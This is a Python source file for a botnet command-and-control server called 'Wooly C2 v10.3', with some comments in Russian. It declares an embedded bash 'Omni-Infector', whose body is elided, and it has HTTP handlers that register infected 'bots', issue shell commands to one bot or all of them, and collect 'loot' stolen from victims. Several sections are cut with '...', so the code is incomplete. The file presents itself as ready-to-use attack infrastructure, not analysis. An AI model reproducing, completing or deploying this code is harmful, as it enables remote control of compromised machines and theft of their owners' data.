#!/usr/bin/env python3
# Wooly VPS C2 v10.3 - FULLY TESTED & READY
import os, ssl, socket, json, subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from html import escape
import socket  # ✅ Добавлен для gethostbyname

# ==================== EMBEDDED INFECTOR (FIXED) ====================
INFECT_SH = '''#!/bin/bash
# Wooly Omni-Infector v10.2 - EMBEDDED VERSION
...
class C2Server(BaseHTTPRequestHandler):
    def do_GET(self):
        ...
        if '/checkin' in self.path:
            ...
            hostname = socket.gethostbyname(socket.gethostname())  # ✅ FIXED
            port = '443' if os.geteuid() == 0 else '8443'
            html = f'''<!DOCTYPE html><html><head><title>🤖 Wooly C2 v10.3 ({len(bots)} bots)</title>
...
<script>setInterval(()=>fetch("/bots").then(r=>r.text()).then(d=>{{document.querySelector("pre").innerText=d.match(/{{.*}}/)[0]||""}}),3000)</script></body></html>'''
    ...
    def do_POST(self):
        ...
        if '/cmd' in self.path:
            ...
            if bot_id == 'ALL' and bots: [commands.__setitem__(bid, cmd) for bid in bots]
            else: commands[bot_id] = cmd
            print(f"📡 '{cmd}' → {bot_id} ({len(bots) if bot_id=='ALL' else '1'})")
            self.send_response(200); self.end_headers(); self.wfile.write(b'OK')
            
        elif '/loot' in self.path:
            try: data = json.loads(post_data); loot_db[data['bot']] = data['data'][:200]
            except: pass
            self.send_response(200); self.end_headers(); self.wfile.write(b'OK')
...
if __name__ == '__main__':
    ...
    print(f"🚀 C2 v10.3 → https://0.0.0.0:{port}"); print(f"📱 https://{socket.gethostbyname(socket.gethostname())}:{port}/bots")
    httpd.serve_forever()
